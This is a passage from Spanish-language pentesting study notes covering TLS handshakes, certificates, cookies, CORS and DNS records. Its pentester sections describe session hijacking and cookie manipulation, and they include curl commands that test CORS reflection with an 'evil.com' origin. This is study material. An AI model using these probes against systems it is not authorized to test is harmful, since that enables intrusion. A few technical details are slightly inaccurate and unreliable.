   |                                      |
   |<-- ServerKeyExchange ----------------|
   |   ECDHE: server's ephemeral public   |
   |   key + signature by server's cert   |
   |                                      |
   |<-- ServerHelloDone ----------------- |
   |                                      |
   |--- ClientKeyExchange --------------->|
   |   ECDHE: client's ephemeral public   |
   |   key                                |
   |                                      |
   |--- ChangeCipherSpec -----------------|
   |   (Ahora cifrado desde el cliente)   |
   |                                      |
   |--- Encrypted Finished -------------->|
   |   (Verificación del handshake        |
   |    cifrada con la clave acordada)    |
   |                                      |
   |<-- ChangeCipherSpec -----------------|
   |<-- Encrypted Finished ---------------|
   |   (Ahora cifrado desde el servidor)  |
   |                                      |
   |=== TLS 1.2 HANDSHAKE COMPLETO =======|
   |=== Ahora envían HTTP cifrado ========|
   |                                      |
   |--- Application Data (HTTP GET /) -->|
   |<-- Application Data (HTTP 200 OK) ---|
```

#### TLS 1.3 Handshake (más rápido):

TLS 1.3 (RFC 8446, 2018) simplificó el handshake de 4 mensajes a 2 (modo normal) o 0 (0-RTT).

```
CLIENTE                                SERVIDOR
   |                                      |
   |--- ClientHello --------------------->|
   |   Key Share: client's ephemeral      |
   |   public key (ECDHE)                 |
   |   Ciphers: solo 5 AEAD ciphers       |
   |   Supported Signature Algorithms     |
   |                                      |
   |<-- ServerHello --------------------- |
   |<-- Encrypted Extensions -------------|
   |<-- Certificate + CertificateVerify --|
   |<-- Finished -------------------------|
   |   (Servidor ya está listo)           |
   |                                      |
   |--- Finished ------------------------>|
   |                                      |
   |=== TLS 1.3 HANDSHAKE COMPLETO =======|
   |   1 RTT total (vs 2 RTT en TLS 1.2)  |
```

#### TLS 1.2 vs TLS 1.3

| Característica | TLS 1.2 | TLS 1.3 |
|---------------|---------|---------|
| Handshake | 2 RTT (full), 1 RTT (resumido) | 1 RTT (full), 0 RTT (resumido) |
| Cipher Suites | Muchas combinaciones (50+) | Solo 5 AEAD: [aes](../raw/crypt0-f0r-h4ck3rs.md#aes)-GCM, ChaCha20-Poly1305 |
| Modo PSK (reanudación) | Opcional | Integrado (0-RTT) |
| Key Exchange | [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa) (deprecado), DH, DHE, ECDHE, ECDH | Solo (EC)DHE (Perfect Forward Secrecy obligatorio) |
| Algoritmos de firma | RSA, DSA, ECDSA, etc. | RSA, ECDSA, EdDSA |
| Compresión | Sí (CRIME attack) | No |
| Renegotiation | Sí (complejo, inseguro) | No |
| Cifrado | Stream/Block Ciphers + MAC por separado | AEAD (Autenticación + Cifrado integrados) |
| Versión negociada | En claro en ServerHello | Encriptada en ServerHello (no se ve en claro) |
| 0-RTT | No | Sí (con anti-replay) |
**Componentes TLS importantes para hacking:**

**Cipher Suites en detalle:**
Combinación de: Key Exchange + Authentication + Cipher + MAC/Hash.

TLS 1.2: `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256`
- ECDHE: Ephemeral Elliptic Curve Diffie-Hellman (key exchange)
- RSA: Authentication (el servidor firma con su clave privada RSA)
- AES_128_GCM: Cifrado simétrico (AES 128-bit en modo GCM)
- SHA256: HMAC para integridad

TLS 1.3: `TLS_AES_128_GCM_SHA256`
- Mucho más simple. Key exchange y firma se negocian aparte.
- Solo 5 ciphers definidos:
  - TLS_AES_128_GCM_SHA256
  - TLS_AES_256_GCM_SHA384
  - TLS_CHACHA20_POLY1305_SHA256
  - TLS_AES_128_CCM_SHA256
  - TLS_AES_128_CCM_8_SHA256

**Cipher Suites débiles (a evitar):**
- **RC4:** Roto, ataques de biases en el keystream
- **DES/3DES:** Clave de 56 bits, roto por fuerza bruta
- **CBC mode con TLS 1.0:** Padding oracle attacks (POODLE, Lucky13)
- **Export ciphers (512 bits):** Diseñados débiles a propósito por restricciones de exportación USA (FREAK attack)
- **NULL cipher (sin cifrado):** Existe para debug, nunca usar
- **anon Diffie-Hellman:** Sin autenticación, MITM directo

**Perfect Forward Secrecy (PFS):**
- Usando DHE o ECDHE, si alguien captura todo el tráfico y DESPUÉS obtiene la clave privada del servidor, NO puede descifrar el tráfico capturado antes
- Las claves de sesión son efímeras (se generan por conexión y se descartan)
- Sin PFS (RSA key exchange): si obtenés la clave privada, descifrás TODO el tráfico grabado histórico
- TODAS las suites en TLS 1.3 tienen PFS obligatorio

**Certificate X.509 en detalle:**
```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1234567890
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=US, O=Let's Encrypt, CN=R3
        Validity:
            Not Before: May 23 00:00:00 2026 GMT
            Not After : Aug 21 00:00:00 2026 GMT
        Subject: CN=google.com
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (256 bit)
                pub: 04:...
        X509v3 extensions:
            X509v3 Subject Alternative Name: 
                DNS:google.com, DNS:*.google.com
            X509v3 Key Usage: Digital Signature
            X509v3 Extended Key Usage: TLS Web Server Authentication
            X509v3 Basic Constraints: CA:FALSE
            X509v3 CRL Distribution Points: ...
            Authority Information Access: ...
```

**Certificate Chain:**
```
Root CA (trusted by browser/system)
  -> Intermediate CA (signed by Root)
    -> Leaf Certificate (signed by Intermediate, este es el cert del servidor)
```

El servidor envía leaf + intermediate(s). El navegador ya confía en la Root CA.

**Certificate Validation (lo que hace el navegador):**
1. **Validez temporal:** fechas Not Before / Not After
2. **Firma:** leaf cert signature verificada con intermediate's public key, intermediate con root
3. **CN/SAN match:** el dominio visitado coincide con CN o SAN
4. **Revocation:** ¿está revocado? (CRL, OCSP)
5. **Key Usage:** el cert es para server authentication, no para firma de código, etc.
6. **Basic Constraints:** el leaf no puede ser CA (CA:FALSE)

**SNI (Server Name Indication):**
Extensión de TLS que permite al cliente decir QUÉ dominio quiere conectar, para que el servidor pueda servir el certificado correcto. Sin SNI, un servidor con múltiples dominios HTTPS no sabe qué certificado mostrar.

```bash
# Con SNI (explícito)
openssl s_client -connect target.com:443 -servername target.com

# Sin SNI (puede dar error si el servidor tiene múltiples certificados)
openssl s_client -connect target.com:443
```

**Para el pentester:**
- SNI te permite escanear virtual hosts: "¿qué certificados tiene este servidor?")
- SNI spoofing: si un servidor no valida SNI, podés conectar a diferentes virtual hosts
- Algunos malware usan SNI para comunicarse con [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) (porque está en el ClientHello en claro)
- Con SNI podés hacer **[domain fronting](../raw/r3d-t34m-1nfr4.md#domain-fronting)** (si el CDN lo permite)

**OCSP (Online Certificate Status Protocol):**
Protocolo para verificar si un certificado está revocado en tiempo real.
- OCSP Request: el navegador pregunta "¿está revocado este certificado?"
- OCSP Response: "good", "revoked", "unknown"
- OCSP Stapling: el servidor obtiene la respuesta OCSP y la "empaqueta" (staple) en el handshake, así el navegador no tiene que hacer otra petición (mejor privacidad)

**OCSP Vulnerability para tracking:**
Si el servidor no implementa OCSP stapling, el navegador contacta al OCSP responder directamente, revelando su IP. Esto permite tracking. En ataques de privacidad, es información valiosa.

**Certificate Pinning:**
- El navegador/cliente guarda una copia del certificado o su hash
- Si el certificado cambia (MITM con certificado falso), la conexión se rechaza
- Ya no se recomienda (HPKP deprecado). Usan Expect-CT y Certificate Transparency como reemplazo

**Certificate Transparency (CT):**
- Todos los certificados SSL deben ser registrados en logs públicos
- Cualquiera puede verificar que un certificado fue emitido legítimamente
- Los navegadores (Chrome) requieren CT para certificados desde 2018
- Permite detectar CAs maliciosas o certificados emitidos sin autorización

**Ataques TLS comunes:**
- **POODLE ([cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2014-3566):** Padding oracle contra SSL 3.0 / TLS CBC
- **Heartbleed (CVE-2014-0160):** Buffer over-read en OpenSSL (filtra memoria del servidor con claves privadas)
- **FREAK (CVE-2015-0204):** Downgrade a export ciphers de 512 bits
- **Logjam (CVE-2015-4000):** Downgrade de DHE a 512 bits
- **CRIME/BREACH:** Compresión + cifrado = adivinar secretos midiendo tamaño
- **BEAST (CVE-2011-3389):** CBC IV predecible en TLS 1.0
- **DROWN (CVE-2016-0800):** Explotar servidor SSLv2 para descifrar conexiones TLS
- ** ROBOT (CVE-2017-17382):** Oracle padding RSA
- **Sweet32 (CVE-2016-2183):** Birthday attack contra cifrados de bloque de 64 bits (3DES, Blowfish)

**Tools TLS para pentester:**
- `testssl.sh`: El estándar de facto para auditar TLS
- `sslscan`: Escanea ciphers y certificados
- `nmap --script ssl-enum-ciphers`: Enumera ciphers via NSE
- `openssl s_client`: Conexión TLS manual (debug)
- `sslyze`: Analizador TLS python

### Cookies

Las cookies son pequeños datos que el servidor almacena en el navegador del cliente. Se envían con cada request al mismo dominio (según Domain y Path).

**Creación:** El servidor envía uno o más headers Set-Cookie en la respuesta:
```
Set-Cookie: session=abc123
```

**Envío en requests subsiguientes:**
```
Cookie: session=abc123; other=xyz
```

**Atributos de Cookie:**

| Atributo | Ejemplo | Descripción |
|----------|---------|-------------|
| Domain | `Domain=.google.com` | A qué dominio(s) se envía la cookie |
| Path | `Path=/admin` | A qué path(s) se envía |
| Expires | `Expires=Tue, 23-May-2027 12:00:00 GMT` | Fecha de expiración |
| Max-Age | `Max-Age=3600` | Tiempo de vida en segundos (prioridad sobre Expires) |
| Secure | (solo el atributo) | Solo se envía por HTTPS |
| HttpOnly | (solo el atributo) | No accesible desde JavaScript (document.cookie) |
| SameSite | `SameSite=Lax` | Control de envío en requests cross-site |

**Atributos de seguridad en detalle:**

**Secure:**
- La cookie solo se envía por HTTPS
- Si la ponés en un Set-Cookie sin Secure, el navegador la envía también por HTTP (riesgo de sniffing en WiFi público)
- Si la cookie tiene Secure y estás en HTTP, no se envía (pero el servidor igual la puede setear si está en HTTPS)

**HttpOnly:**
- La cookie no es accesible desde JavaScript con `document.cookie`
- Si hay XSS, el atacante no puede leer la cookie
- Es la defensa principal contra robo de sesión por XSS
- No previene [csrf](../raw/w3b-h4ck1ng.md#csrf) (el navegador igual envía la cookie automáticamente)

**SameSite (RFC 6265bis):**
- Controla si la cookie se envía en requests cross-site
- Previene ataques CSRF

| SameSite | Navegación (link) | POST desde otro sitio | Embedidos (fetch/img) |
|----------|-------------------|----------------------|----------------------|
| None | Sí | Sí | Sí |
| Lax (default) | Sí | No (except GET top-level) | No |
| Strict | No | No | No |

- **Lax:** el nuevo default desde 2020 (Chrome 80, luego los demás)
- **Strict:** máxima seguridad, pero rompe navegación desde links externos
- **None:** No protege contra CSRF. Requiere Secure.

**Cookie Prefixes (defensa adicional):**
```
Set-Cookie: __Host-session=abc123; Path=/; Secure
Set-Cookie: __Secure-token=xyz; Secure
```
- `__Host-`: La cookie solo se crea si: Domain no está, Path=/, Secure presente
- `__Secure-`: La cookie solo se crea si Secure está presente

**Para el pentester:**
1. **Session hijacking:** Robar la cookie de sesión (por XSS, sniffing, malware, o session prediction)
2. **Cookie tossing:** Si el dominio `.google.com` permite crear cookies desde un subdominio comprometido, podés sobrescribir cookies de otro subdominio
3. **Cookie bomb:** Crear cookies muy grandes para causar DoS en el servidor (las cookies se envían en cada request)
4. **Cookie scanning:** Analizar cookies en busca de información sensible
5. **Cookie manipulation:** Modificar cookies para escalar privilegios (admin=true, user_id=1)
6. **Cookie prefix bypass:** Algunos servidores no validan `__Host-` correctamente

### CORS (Cross-Origin Resource Sharing)

CORS es un mecanismo de seguridad del navegador que controla cómo los recursos de un origen pueden ser solicitados desde otro origen.

**Origen = Protocolo + Dominio + Puerto**

Ejemplos de orígenes que NO son el mismo:
- `https://google.com:443` vs `https://google.com:8080` → diferente puerto
- `http://google.com` vs `https://google.com` → diferente protocolo
- `https://google.com` vs `https://mail.google.com` → diferente dominio

**Same-Origin Policy (SOP):**
Por default, el navegador bloquea requests desde un origen a otro que intenten LEER la respuesta.
- `https://evil.com` puede ENVIAR un request a `https://bank.com/api/balance`
- Pero NO puede LEER la respuesta a menos que CORS lo permita
- Excepciones: `<img>`, `<script>`, `<link>`, `<form>` pueden cargar cross-origin (no pueden leer)

**¿Cómo funciona CORS?**

1. El navegador envía un request cross-origin con el header `Origin`
2. El servidor responde con `Access-Control-Allow-Origin` si acepta
3. El navegador verifica el header. Si no coincide o no está, bloquea la respuesta (el JS no la ve)

**Simple Request:**
Request que usa GET/HEAD/POST con Content-Type simple (form, text/plain, multipart) y sin headers personalizados.
```
GET /api/data HTTP/1.1
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Content-Type: application/json
```
El navegador permite leer la respuesta solo si Access-Control-Allow-Origin coincide con Origin.

**Preflight Request (OPTIONS):**
Para requests no simples (ej: PUT, DELETE, Content-Type: application/json, headers personalizados), el navegador envía un preflight OPTIONS antes.
```
OPTIONS /api/data HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: X-Custom-Header

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Max-Age: 86400
```

**CORS headers de response:**

| Header | Ejemplo | Descripción |
|--------|---------|-------------|
| Access-Control-Allow-Origin | `*` o `https://example.com` | Qué orígenes pueden LEER la respuesta |
| Access-Control-Allow-Methods | `GET, POST, PUT` | Métodos permitidos en preflight |
| Access-Control-Allow-Headers | `Content-Type, Authorization` | Headers permitidos en preflight |
| Access-Control-Expose-Headers | `X-My-Header` | Headers response expuestos a JS (no solo los básicos) |
| Access-Control-Allow-Credentials | `true` | Permitir cookies/credentials en cross-origin |
| Access-Control-Max-Age | `86400` | Cachear preflight por N segundos |

**Vulnerabilidades comunes de CORS:**

**1. ACAO: `*` (wildcard) sin restricciones:**
Cualquier sitio puede leer la respuesta.
```
Access-Control-Allow-Origin: *
```
- Peligroso si el endpoint expone datos sensibles
- No permite credentials (cookies) con `*` (el navegador no lo permite)

**2. ACAO reflejado sin validación (el clásico bug):**
El servidor devuelve el Origin que recibe sin verificar. Cualquier dominio puede leer la respuesta.
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
Esto es un bug GRAVE porque permite credenciales (cookies) + cualquier origen.

**3. ACAO: null origin permitido:**
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
Se puede explotar desde sandboxed iframes, data: URIs, o file: protocol.

**4. Origin: null forzado por el atacante:**
Con un sandboxed iframe (`sandbox` attribute), el navegador envía `Origin: null`. Si el servidor acepta null, el ataque funciona.

**Para el pentester:**
```bash
# Testear si refleja Origin
curl -H "Origin: https://evil.com" -I http://target/api/endpoint

# Ver si devuelve Access-Control-Allow-Origin: https://evil.com

# Testear con credentials
curl -H "Origin: https://evil.com" -H "Cookie: session=abc" -I http://target/api/endpoint
```

---

## [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns)

### ¿Qué es DNS?

DNS (Domain Name System) es el "directorio telefónico" de Internet. Traduce nombres de dominio (google.[com](../raw/w1n-s9bsyst3ms.md#com)) a direcciones [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) (142.250.184.78).

Para el hacking, DNS es un vector de ataque enorme: [dns spoofing](../raw/m1tm-m0b1l3.md#dns-spoofing), DNS tunneling, domain takeover, DNS rebinding, DNS cache poisoning, subdomain enumeration, etc.

### Jerarquía DNS

DNS es jerárquico y distribuido. Nadie tiene toda la base de datos — cada nivel es responsable de su parte.

```
Root (.)
|-- .com (TLD)
|   |-- google.com (Authoritative)
|   |   |-- www.google.com -> A record
|   |   |-- mail.google.com -> A record
|   |   +-- ...
|   |-- facebook.com
|   +-- ...
|-- .org (TLD)
|-- .net (TLD)
|-- .ar (ccTLD)
|   |-- google.com.ar
|   +-- ...
|-- .io (TLD)
+-- ...
```

#### Root Servers (13 logical, hundreds of physical)

Son los servidores en la cúspide de la jerarquía. Conocen las [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) de los servidores TLD. Opera ICANN.

Los 13 root servers (letras a-m):
- a.root-servers.net (Verisign, USA)
- b.root-servers.net (USC-ISI, USA)
- c.root-servers.net (Cogent, USA)
- d.root-servers.net (University of Maryland, USA)
- e.root-servers.net (NASA, USA)
- f.root-servers.net (ISC, USA - manycast global)
- g.root-servers.net (DoD, USA)
- h.root-servers.net (US Army, USA)
- i.root-servers.net (Netnod, Sweden)
- j.root-servers.net (Verisign, USA)
- k.root-servers.net (RIPE, Europe - manycast)
- l.root-servers.net (ICANN, USA)
- m.root-servers.net (WIDE, Japan)

**Manycast:** varias máquinas físicas distribuidas geográficamente comparten la misma IP anycast. Esto mejora performance y DDoS resilience.

Si todos los root servers caen, Internet sigue andando un rato gracias al TTL en los resolvers, pero eventualmente las resoluciones de dominios nuevos fallan.

#### TLD (Top-Level Domain) Servers

Conocen las IPs de los servidores autoritativos para cada dominio dentro de su TLD.

Tipos de TLD:
- **gTLD (Generic):** .com, .org, .net, .info, .biz, .name, .pro
- **ccTLD (Country Code):** .ar (Argentina), .br (Brasil), .uk (Reino Unido), .jp (Japón), .de (Alemania)
- **sTLD (Sponsored):** .gov (US Government), .edu (Education), .mil (US Military), .aero, .museum
- **new gTLD:** .xyz, .online, .tech, .app, .dev, .blog, .shop, .[cloud](../raw/cl0ud-h4ck1ng.md) (cientos desde 2012)

Cada TLD es operado por un registry:
- Verisign opera .com y .net
- NIC Argentina opera .ar
- Public Interest Registry opera .org

#### Authoritative Nameservers

Son los servidores que tienen la información REAL de un dominio. Responden con los records DNS.

Normalmente hay 2+ servidores autoritativos por dominio (redundancia):
```
google.com NS = ns1.google.com, ns2.google.com, ns3.google.com, ns4.google.com
```

El registro NS del dominio (en el TLD) apunta a estos servidores.

**Glue Records:** Cuando el NS de un dominio está dentro del mismo dominio (ej: ns1.midominio.com), se necesita un glue record en el TLD para evitar el loop de resolución.

#### Resolver (Recursive Resolver)

Es el servidor DNS que hace la resolución en nombre del cliente. Recibe la consulta del usuario y hace las consultas recursivas hasta obtener la respuesta.

Resolvers públicos:
- **Google DNS:** 8.8.8.8, 8.8.4.4
- **Cloudflare DNS:** 1.1.1.1, 1.0.0.1
- **Quad9:** 9.9.9.9 (bloquea dominios maliciosos)
- **OpenDNS:** 208.67.222.222, 208.67.220.220 (Cisco)
- **Cisco Umbrella:** 208.67.222.123 (con blocking)
- **NIC Argentina:** 200.16.76.18

#### Stub Resolver

Es el resolver que corre en tu máquina ([systemd](../raw/l1n9x-4dm1n.md#systemd)-resolved, dnscache en Windows). Recibe requests de la aplicación, los envía al resolver recursivo configurado, y devuelve la respuesta.

Configuración:
- Linux: /etc/resolv.conf (nameserver 8.8.8.8)
- Windows: Configuración de [red](../raw/r3d3s-f0nd4m3nt0s.md) → DNS servers
- macOS: /etc/resolv.conf (manejado por System Configuration)

#### Resolución Iterativa vs Recursiva

**Recursiva (stub resolver -> resolver público):**
El cliente pregunta a un resolver, y el resolver hace TODO el trabajo y devuelve la respuesta final.

**Iterativa (resolver público -> root -> TLD -> authoritative):**
El resolver pregunta al root, el root no sabe pero dice "preguntale al TLD". El resolver pregunta al TLD, el TLD dice "preguntale al authoritative". El resolver pregunta al authoritative y obtiene la respuesta.

**Esquema completo:**
```
1. Cliente (stub) -> Resolver (8.8.8.8): ¿IP de google.com?
2. Resolver -> Root: ¿IP de google.com?
3. Root -> Resolver: No sé, preguntá a .com TLD (a.gtld-servers.net)
4. Resolver -> .com TLD: ¿IP de google.com?
5. .com TLD -> Resolver: Preguntá a ns1.google.com (autoritativo)
6. Resolver -> ns1.google.com: ¿IP de google.com?
7. ns1.google.com -> Resolver: 142.250.184.78 (record A)
8. Resolver -> Cliente: 142.250.184.78
```
### DNS Query — Formato del Paquete

DNS corre sobre [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) ([puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 53) para consultas normales, y [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) ([puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 53) para respuestas grandes (>512 bytes), zone transfers (AXFR/IXFR), o cuando el flag TC está activo.

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                           ID                                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|QR| Opcode |AA|TC|RD|RA| Z|AD|CD|           RCODE              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      QDCOUNT (1)                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      ANCOUNT                                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      NSCOUNT                                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      ARCOUNT                                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        QUERY                                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        ANSWER                                  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        AUTHORITY                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        ADDITIONAL                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Campos del header DNS:**
- **ID (16 bits):** Transaction ID. Asocia pregunta con respuesta.
- **QR (1 bit):** 0 = query, 1 = response.
- **Opcode (4 bits):** 0 = standard, 1 = inverse, 2 = server status, 4 = notify, 5 = update.
- **AA (1 bit):** Authoritative Answer — viene del servidor autoritativo.
- **TC (1 bit):** Truncated — respuesta muy grande para UDP, usar TCP.
- **RD (1 bit):** Recursion Desired — el cliente quiere resolución recursiva.
- **RA (1 bit):** Recursion Available — el servidor soporta recursión.
- **Z (1 bit):** Reservado (siempre 0).
- **[ad](../raw/w1nd0ws-d0m41n-4dm1n.md) (1 bit):** Authentic Data — DNSSEC: datos autenticados.
- **CD (1 bit):** Checking Disabled — DNSSEC: no validar.
- **RCODE (4 bits):** Response code: 0=OK, 1=Format Error, 2=Server Failure, 3=NXDOMAIN, 4=Not Implemented, 5=Refused, 6-15 = varios (YXDOMAIN, YXRRSET, etc.).
- **QDCOUNT:** Número de preguntas (casi siempre 1).
- **ANCOUNT:** Número de respuestas (records en ANSWER).
- **NSCOUNT:** Número de registros de autoridad (nameservers).
- **ARCOUNT:** Número de registros adicionales (glue records).

**Formato de una pregunta DNS (QUERY):**
```
| QNAME (variable) | QTYPE (2 bytes) | QCLASS (2 bytes) |
```
- **QNAME:** El nombre codificado en etiquetas de largo+texto, terminado en 0.
  - Ej: `3www5google3com0` para www.google.com.
  - Cada label: 1 byte de longitud + caracteres, termina con 0.
- **QTYPE:** 1 = A, 28 = AAAA, 15 = MX, 5 = CNAME, 2 = NS, 255 = ANY, etc.
- **QCLASS:** 1 = IN (Internet), el único que importa.

**Formato de un Resource Record (ANSWER):**
```
| NAME (2 bytes si comprimido) | TYPE (2) | CLASS (2) | TTL (4) | RDLENGTH (2) | RDATA (variable) |
```
- **NAME:** [puntero](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#punteros) a nombre comprimido (si está en el mismo paquete), o nombre completo.
- **TYPE:** Tipo de record (A, AAAA, MX, etc.).
- **CLASS:** IN (1).
- **TTL:** Time To Live en segundos.
- **RDLENGTH:** Largo de los datos.
- **RDATA:** Los datos del record (4 bytes para A, 16 para AAAA, [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) para TXT).

### DNS Record Types (en detalle)

| Type | Número | Descripción | Ejemplo |
|------|--------|-------------|---------|
| A | 1 | IPv4 address | google.com -> 142.250.184.78 |
| AAAA | 28 | IPv6 address | google.com -> 2800:3f0:4001::200e |
| CNAME | 5 | Canonical name (alias) | www.google.com -> google.com |
| MX | 15 | Mail exchange (prioridad + servidor) | @google.com aspmx.l.google.com priority 10 |
| TXT | 16 | Text record (SPF, DKIM, DMARC, verificación) | "v=spf1 include:_spf.google.com ~all" |
| NS | 2 | Nameserver del dominio | google.com -> ns1.google.com |
| SOA | 6 | Start of Authority (información de zona) | Ver detalle abajo |
| PTR | 12 | Pointer (reverse DNS) | 78.184.250.142.in-addr.arpa -> google.com |
| SRV | 33 | Service locator (_service._proto.domain) | _sip._tcp.example.com 5060 server.example.com |
| CAA | 257 | CA Authorization (qué CAs pueden emitir) | 0 issue "letsencrypt.org" |
| DS | 43 | DNSSEC Delegation Signer | [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) de clave DNSKEY del hijo |
| RRSIG | 46 | DNSSEC signature | Firma de un record [set](../raw/ph1sh1ng.md#social-engineering-toolkit) |
| DNSKEY | 48 | DNSSEC public key | Clave pública del dominio |
| NSEC | 47 | DNSSEC denial of existence | Prueba de que un record no existe |
| NSEC3 | 50 | NSEC with hashing | NSEC pero hasheado (previene zone walking) |
| AFSDB | 18 | AFS database | Servidor AFS |
| APL | 42 | Address Prefix List | Lista de prefijos de red |
| HINFO | 13 | Host info | CPU + OS (raro) |
| LOC | 29 | Location record | Coordenadas geográficas del servidor |
| RP | 17 | Responsible person | Email de contacto (obsoleto) |
| SSHFP | 44 | SSH public key fingerprint | Huella de clave SSH para verificación |
| TLSA | 52 | [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)/[ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) cert association (DANE) | Asocia cert con DNS (TLSA) |
| URI | 256 | URI record | Mapea nombre a URI |
| EUI48 | 108 | MAC address (48-bit) | MAC address |
| EUI64 | 109 | MAC address (64-bit) | MAC address |
| NAPTR | 35 | Naming Authority Pointer | Usado en ENUM (telefonía) e IPP |

**A Record en detalle:**
```
google.com.  300  IN  A  142.250.184.78
```
- google.com.: nombre FQDN (termina en punto)
- 300: TTL en segundos (300 = 5 minutos)
- IN: clase Internet
- A: tipo Address
- 142.250.184.78: IPv4

**CNAME Record:**
```
www.google.com.  300  IN  CNAME  google.com.
```
- Define un alias. El cliente DEBE resolver ambos (CNAME -> A).
- Un dominio NO puede tener CNAME y otros records (MX, A, TXT) al mismo tiempo (RFC 2181).
- En la respuesta DNS, el CNAME viene en la sección ANSWER, y el A viene en ADDITIONAL.
- **CNAME chain:** www -> alias1 -> alias2 -> A. Mala práctica, agrega latencia.

**MX Record:**
```
example.com.  3600  IN  MX  10  mail.example.com.
example.com.  3600  IN  MX  20  backup-mail.example.com.
```
- Prioridad: número más bajo = mayor prioridad. Correo se entrega al de menor prioridad.
- Si el primero no está disponible, se usa el segundo (failover).
- **MX en pentesting:** Enumeración de servidores de correo. MX reveal puede dar IPs internas.

**TXT Record (SPF en detalle):**
```
example.com.  3600  IN  TXT  "v=spf1 ip4:192.168.0.0/24 include:_spf.google.com -all"
```
- **v=spf1:** Versión
- **ip4:192.168.0.0/24:** IPs autorizadas a enviar mail por este dominio
- **include:_spf.google.com:** Incluir también las IPs del SPF de google.com
- **-all:** Rechazar todos los demás (fail)
- **~all:** Softfail (marcar como spam pero no rechazar)
- **+all:** Cualquiera puede enviar (peligroso)
- **?all:** Neutral (sin política)

**DKIM (TXT):**
```
google._domainkey.google.com.  3600  IN  TXT  "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC..."
```
- Firma criptográfica de los mails salientes
- El receptor verifica la firma contra la clave pública en DNS
- `google._domainkey`: selector (elegido por el administrador)

**DMARC (TXT):**
```
_dmarc.example.com.  3600  IN  TXT  "v=DMARC1; p=reject; rua=mailto:dmarc@example.com; ruf=mailto:forensic@example.com"
```
- Política de qué hacer cuando SPF y/o DKIM fallan
- `p=none`: solo monitoreo y reportes
- `p=quarantine`: marcar como spam
- `p=reject`: rechazar el mail
- `rua`: dirección para reportes agregados (XML)
- `ruf`: dirección para reportes forenses
- `pct`: porcentaje de mails a filtrar (para rollout gradual)

**SOA Record — Start of Authority:**
```
example.com.  60  IN  SOA  ns1.example.com.  admin.example.com. (
        2025052301  ; serial (YYYYMMDDNN)
        7200        ; refresh (2h)
        1800        ; retry (30min)
        1209600     ; expire (14 days)
        60          ; minimum TTL (1 min)
)
```
- **Serial:** Número de versión de la zona. Se incrementa con cada cambio.
- **Refresh:** Cada cuánto (segundos) el secundario consulta al primario.
- **Retry:** Si refresh falla, cada cuánto reintentar.
- **Expire:** Cuánto tiempo el secundario puede servir datos si no contacta al primario.
- **Minimum TTL:** TTL por defecto para records negativos (NXDOMAIN).

**PTR Record (Reverse DNS):**
```
78.184.250.142.in-addr.arpa.  86400  IN  PTR  google.com.
```
- Mapea IP -> nombre (inverso de A).
- Formato: IP revertida + `.in-addr.arpa` para IPv4.
- IPv6: IP revertida nibble por nibble + `.ip6.arpa`.
- **Útil para:** verificación de identidad (servidores de mail verifican PTR = HELO).
- **Pentester:** permite descubrir qué nombre de dominio tiene una IP (reconnaissance).

**SRV Record:**
```
_sip._tcp.example.com.  86400  IN  SRV  10 60 5060 sipserver.example.com.
```
- Prioridad: menor = mejor.
- Weight: si misma prioridad, distribuye por peso.
- Port: puerto del servicio.
- Target: hostname del servidor.

**CAA Record:**
```
